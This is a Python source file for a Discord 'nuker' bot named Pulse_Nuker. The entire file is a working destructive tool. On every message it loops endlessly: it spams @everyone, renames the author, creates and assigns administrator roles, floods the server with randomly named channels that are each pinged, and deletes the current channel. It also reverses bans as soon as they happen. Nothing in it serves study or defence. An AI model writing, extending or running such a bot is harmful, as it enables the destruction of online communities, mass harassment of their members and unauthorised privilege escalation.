import os
import discord
import time
import random
import string
from discord.utils import get

def randomletters(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

TOKEN = ("")

client=discord.Client(intents=discord.Intents.all())


@client.event
async def on_ready():
    print('connected to Discord!')
    return await client.change_presence(activity=discord.Game(name='Pulse_Nuker'))
    

@client.event
async def on_member_ban(guild,user):
    await guild.unban(user)
    print("removed ban")


@client.event
async def on_message(message):
    response = '@everyone'
    
    while True:
        print("message sent "+random.choice(string.ascii_letters))
        try:
            await message.channel.send(response)
        except:
            print("message error")
            pass
        try:
            user=message.author
            await user.edit(nick=randomletters(3))
        except:
            print("can't change user nick")
            pass
        guild=message.guild
        perms=discord.Permissions(administrator=True)
        try:
            user=message.author
            await guild.create_role(name='TEST', colour=discord.Colour(0x597E8D),permissions=perms)
            role=get(guild.roles,name='TEST')
            await user.add_roles(role)
        except:
            print('maximum number of roles reached')
            pass
        guild=message.guild
        
        await guild.create_text_channel(randomletters(99))
        await guild.create_text_channel(randomletters(99))
        await message.channel.delete()
        print("channel yeeted")
        user=message.author
        
@client.event
async def on_command_error(error):
    if isinstance(error, discord.HTTPException):
        time.sleep(10)

@client.event
async def on_guild_channel_create(channel):
    await channel.send("@everyone")

client.run(TOKEN)


#Made by Pulse.